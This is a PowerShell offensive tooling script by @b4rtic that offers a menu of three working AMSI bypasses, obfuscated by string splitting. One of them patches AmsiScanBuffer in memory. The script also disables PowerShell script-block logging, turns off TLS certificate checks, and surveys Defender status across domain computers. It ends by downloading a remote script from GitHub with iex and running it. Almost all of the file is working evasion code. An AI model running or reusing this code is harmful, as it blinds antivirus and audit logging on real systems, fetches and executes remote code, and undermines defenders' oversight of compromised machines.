function AV-Bypass-Setup
<#
.SYNOPSIS
	PowerShell AMSI and Logging Bypass.
	Resources:
	  - @_xpn_ => https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
.DESCRIPTION
	Author: @b4rtic
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None
.EXAMPLE
	C:\PS> AV-Bypass-Setup
#>
{ 
	Write-host ""
	Write-host "Evasion technique: "
	Write-host ""
	Write-host "1 Reflection "
	Write-host "2 Patching"
	Write-host "3 Error"
	Write-host ""
	
    $menuevcmd = Read-Host -Prompt 'Set evasion option'
	
	switch($menuevcmd)
	{
			1 {
				
				#Matt Graeber's Reflection method
				
				Write-host " "
				Write-host "Running Reflection method"
				[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls').GetField('ams'+'iIni'+'tFa'+'iled','NonPublic,Static').SetValue($null,$true)
			}
			2 {
                		
				#@_xpn_'s Patching method
				
				Write-host " "
				Write-host "Running Patching method"
$win32 = @"
using System.Runtime.InteropServices;
using System;
public class Win32 {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@;

				Add-Type $win32
				$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary('a'+'ms'+'i.dll'), 'Am'+'si'+'Sc'+'an'+'Bu'+'ffer')
				$b = 0
				[Win32]::VirtualProtect($ptr, [UInt32]5, 0x40, [Ref]$b)
				$buf = New-Object Byte[] 7
				$buf[0] = 0x66; $buf[1] = 0xb8; $buf[2] = 0x01; $buf[3] = 0x00; $buf[4] = 0xc2; $buf[5] = 0x18; $buf[6] = 0x00;
				[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 7)			
			}
          	      3 {
                
				#@_xpn_'s Patching method
				
				Write-host " "
				Write-host "Running Error forcing method"
						$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
				[Ref].Assembly.GetType("System.Management.Automation.A"+"msi"+"Uti"+"ls").GetField('am'+'siS'+'ess'+'ion',"NonPublic,Static").SetValue($null, $null);
				[Ref].Assembly.GetType("System.Management.Automation.Am"+"s"+"iU"+"tils").GetField('a'+'msiC'+'ont'+'ext',"NonPublic,Static").SetValue($null, [IntPtr]$mem)			
			}
		      4 {
				Write-host " "
				Write-host "No evasion method"		
			}
		default {return}
	}
	
	$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
	$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
	$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging","0")

    #Needed for https call with fake cert
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;

}
function Get-AVStatus {
 
	[CmdletBinding()]
	param
	(

	[ValidateSet('Server','Computer')]
	$scope

	)

	$output=@()
	
	switch ($Scope) {

		Server 
		{
			$server=Get-ADComputer -Filter 'operatingsystem -like "*server*" -and enabled -eq "true"' | Select-Object -ExpandProperty Name

			foreach ($s in $server) 
			{
				$result=Invoke-Command -ComputerName $s {Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,` BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated}

				if ($result) 
				{
					Write-host "Computer: $result.PSComputername"
					Write-host "Anti-Virus: $result.AntivirusEnabled"
					Write-host "AV Update: $result.AntivirusSignatureLastUpdated"
					Write-host "Anti-Spyware: $result.AntispywareEnabled"
					Write-host "Anti-Malware: $result.AMServiceEnabled"
					Write-host "Behavior Monitor: $result.BehaviorMonitorEnabled"
					Write-host "Office-Anti-Virus: $result.IoavProtectionEnabled"
					Write-host "NIS: $result.NISEnabled"
					Write-host "Access Prot: $result.OnAccessProtectionEnabled"
					Write-host "R-T Prot: $result.RealTimeProtectionEnabled"
				}

			}
		}

		Computer {

			$comp=Get-ADComputer -Filter 'enabled -eq "true"' | Select-Object -ExpandProperty Name

			foreach ($c in $comp) {
				$result = Invoke-Command -ComputerName $c {Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,` BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated}

				if ($result) 
				{
					Write-host "Computer: $result.PSComputername"
					Write-host "Anti-Virus: $result.AntivirusEnabled"
					Write-host "AV Update: $result.AntivirusSignatureLastUpdated"
					Write-host "Anti-Spyware: $result.AntispywareEnabled"
					Write-host "Anti-Malware: $result.AMServiceEnabled"
					Write-host "Behavior Monitor: $result.BehaviorMonitorEnabled"
					Write-host "Office-Anti-Virus: $result.IoavProtectionEnabled"
					Write-host "NIS: $result.NISEnabled"
					Write-host "Access Prot: $result.OnAccessProtectionEnabled"
					Write-host "R-T Prot: $result.RealTimeProtectionEnabled"					
				}
			}
		}
		default {

			Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,`NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated
		}
	}
	Write-Output $result
}
Write-host ""
Write-host "Localhost AV Status"
Get-AVStatus
AV-Bypass-Setup

iex((New-Object system.net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Console/PowerTheShell.ps1'))